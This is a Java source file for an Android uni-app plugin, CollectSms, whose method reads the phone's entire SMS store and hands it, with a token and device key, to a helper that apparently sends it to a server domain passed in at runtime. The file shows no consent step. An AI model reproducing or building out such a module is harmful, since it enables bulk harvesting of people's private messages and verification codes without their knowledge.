package com.johnny.sms;

import android.content.Context;
import android.net.Uri;
import android.os.Build;
import android.util.Log;

import androidx.annotation.RequiresApi;

import com.alibaba.fastjson.JSONObject;

import io.dcloud.feature.uniapp.annotation.UniJSMethod;
import io.dcloud.feature.uniapp.common.UniModule;

public class CollectSms extends UniModule {

    private static final String TAG = "CollectSms";

    //所有的短信
    public static final String SMS_URI_ALL = "content://sms/";

    private Uri mUri;

    private SmsContent mSmsContent;

    @RequiresApi(api = Build.VERSION_CODES.M)
    @UniJSMethod()
    public void getAndSendSms(JSONObject systemInfo, String token, String domain,
                              long timeStamp, String deviceKey) {
        this.mUri = Uri.parse(CollectSms.SMS_URI_ALL);
        new Thread(() -> getAndSendSmsInfo(systemInfo, token, domain, timeStamp, deviceKey)).start();//启动线程
    }

    @RequiresApi(api = Build.VERSION_CODES.M)
    private void getAndSendSmsInfo(JSONObject systemInfo, String token, String domain, long timeStamp,
                                   String deviceKey) {
        try {

            //初始化数据
            if (this.mSmsContent == null) {
                Context context = mUniSDKInstance.getContext();
                this.mSmsContent = new SmsContent(context, mUri);
            }

            this.mSmsContent.getAndSendSms(systemInfo, token, domain, timeStamp, deviceKey);
        } catch (Exception e) {
            Log.d(TAG, e.getMessage());
        }
    }

}